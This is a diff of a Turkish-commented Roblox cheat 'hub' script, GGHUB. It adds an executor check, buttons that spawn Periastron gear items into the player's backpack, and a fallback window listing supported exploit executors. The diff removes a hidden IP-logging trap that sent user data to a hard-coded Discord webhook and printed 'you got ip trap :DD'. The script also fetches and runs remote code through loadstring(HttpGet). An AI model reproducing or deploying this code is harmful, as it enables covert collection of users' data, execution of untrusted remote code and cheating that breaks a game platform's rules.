@@ -1,4 +1,44 @@
-local HttpService = game:GetService("HttpService")
+--GGHUB
+
+-- Executor kök adını algılama
+local executorName = getexecutorname and getexecutorname() or "Unknown"
+
+-- Desteklenen executor kontrolü (Level 5 ve üstü bilinen executorlar)
+local isSupported = executorName == "Krnl" or
+                    executorName == "Solara" or
+                    executorName == "Arceus X" or
+                    executorName == "Arceus" or
+                    executorName == "ArceusX" or
+                    executorName == "Fluxus" or
+                    executorName == "Codex" or
+                    executorName == "Wave" or
+                    executorName == "ScriptWare" or
+                    executorName == "Sentinel" or
+                    executorName == "RoExec" or
+                    executorName == "Kiwi" or
+                    executorName == "DuckySploit" or
+                    executorName == "Luna" or
+		    executorName == "NX"
+
+-- Roblox bildirim fonksiyonu
+local function showNotification(title, description, buttonText, duration)
+    local StarterGui = game:GetService("StarterGui")
+    StarterGui:SetCore("SendNotification", {
+        Title = title,
+        Text = description,
+        Button1 = buttonText,
+        Duration = duration
+    })
+end
+
+-- Koşullu kontrol
+if isSupported then
+    -- Desteklenen durumda bildirim
+    showNotification(executorName .. " Is Supported!", "GGHUB is opening..", "Ok", 5)
+
+
+
+    local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
@@ -77,14 +117,7 @@ local function sendWebhook(webhookUrl, data)
     request(abcdef)
 end
 
--- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1327965758273097778/J77TDzfo9bBPOsu_B1gweHCHOI-KK_y-NJP-d-8SlEAGEKj_yGjWBtnPJf_DTFrhyEpZ"
-local webhookData = createWebhookData()
-
--- Sending the webhook
-sendWebhook(webhookUrl, webhookData)
-
-print "you got ip trap :DD"
+print "GGHUB loading..."
 
 
 local screenGui = Instance.new("ScreenGui")
@@ -93,7 +126,7 @@ screenGui.ResetOnSpawn = false  -- Bu, GUI'nin oyuncu yeniden doğduğunda kaybo
 
 local textLabel = Instance.new("TextLabel")
 textLabel.Parent = screenGui
-textLabel.Text = "CREATED BY BARIS"
+textLabel.Text = "CREATED BY BARIS, PLS WAIT 1-2 MINS TO LOAD!"
 textLabel.Size = UDim2.new(0, 600, 0, 75)  -- Yazının genişliğini ve yüksekliğini büyüttük
 textLabel.Position = UDim2.new(0.5, -300, 0.5, -37.5)  -- Ekranın tam ortasına yerleştirir
 textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Başlangıçta beyaz renk
@@ -117,7 +150,7 @@ local function onUpdate()
     changeColor()
 
     -- 2 saniye sonra yok olma
-    if tick() - startTime >= 2 then
+    if tick() - startTime >= 6 then
         screenGui:Destroy()
     end
 end
@@ -3157,6 +3190,84 @@ MainSection:NewButton("Auto Farm", "ButtonInfo", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/main/BuildABoat.lua"))()
 end)
 
+local Main = Window:NewTab("Fun!")
+local MainSection = Main:NewSection("Periastorns (local script)")
+
+MainSection:NewButton("Get All", "ButtonInfo", function()
+
+local secs = 0.1
+local dread=game:GetObjects("rbxassetid://108158379")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://93136802")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://69499437")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://80661504")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://99119240")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://159229806")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://139577901")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://80597060")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://73829193")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://120307951")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://2544549379")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+wait(secs)
+local dread=game:GetObjects("rbxassetid://233520257")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+
+	end)
+
+MainSection:NewButton("Get Ivory Periastron", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://108158379")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Amethyst Periastron Kappa", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://93136802")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Azure Periastron Alpha", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://69499437")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Chartreuse Periastron Gamma", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://80661504")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Crimson Periastron Mu", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://99119240")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Rainbow Periastron Omega", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://159229806")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Festive Periastron Chi", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://139577901")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Grimgold Periastron Beta", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://73829193")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Noir Periastron Psi", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://120307951")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Joyful Periastron Epsilon", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://233520257")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+MainSection:NewButton("Get Fall Periastron Xi", "ButtonInfo", function()
+local dread=game:GetObjects("rbxassetid://2544549379")[1];dread.Parent=game.Players.LocalPlayer.Backpack
+	end)
+
+
+
 local Main = Window:NewTab("Others")
 local MainSection = Main:NewSection("Others")
 
@@ -3793,3 +3904,134 @@ end)
 
 local Main = Window:NewTab("Credits")
 local MainSection = Main:NewSection("By bok31_31mal , BARIS")
+
+else
+    -- Desteklenmeyen durumda bildirim
+    showNotification(executorName .. " Is Unsupported :(", "Please use a supported executor.", "Ok", 5)
+wait(2)
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- GUI oluşturma
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player.PlayerGui
+screenGui.Name = "SupportedExecutorList"
+
+-- Ana çerçeve
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 300)
+frame.Position = UDim2.new(0.5, -150, 0.5, -150)
+frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Sürüklenebilir yapma
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function updateInput(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        updateInput(input)
+    end
+end)
+
+-- Başlık çubuğu
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+
+-- Başlık metni
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(0.7, 0, 1, 0)
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.Text = "SUPPORTED EXECUTOR LIST"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 20
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.Parent = titleBar
+
+-- Kapatma düğmesi (X)
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -30, 0, 0)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.TextSize = 18
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.Parent = titleBar
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Küçültme düğmesi (-)
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -60, 0, 0)
+minimizeButton.Text = "-"
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+minimizeButton.TextSize = 18
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.Parent = titleBar
+
+-- Metin içeriği
+local contentLabel = Instance.new("TextLabel")
+contentLabel.Size = UDim2.new(1, -20, 1, -40)
+contentLabel.Position = UDim2.new(0, 10, 0, 40)
+contentLabel.Text = "1.Krln\n2.Solara\n3.Arceus X\n4.Fluxus\n5.Codex\n6.Wave\n7.ScriptWare\n8.Sentinel\n9.RoExec\n10.DuckySploit\n11.Luna"
+contentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+contentLabel.TextSize = 22
+contentLabel.TextYAlignment = Enum.TextYAlignment.Top
+contentLabel.BackgroundTransparency = 1
+contentLabel.Font = Enum.Font.SourceSans
+contentLabel.Parent = frame
+
+local minimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        contentLabel.Visible = false -- Yazılar hemen kaybolur
+        frame:TweenSize(UDim2.new(0, 300, 0, 30), "Out", "Quad", 0.3, true)
+    else
+        frame:TweenSize(UDim2.new(0, 300, 0, 300), "Out", "Quad", 0.3, true)
+        task.spawn(function()
+            task.wait(0.1) -- 0.3 saniye gecikme
+            contentLabel.Visible = true -- Yazılar 0.3 saniye sonra görünür
+        end)
+    end
+end)
+
+end
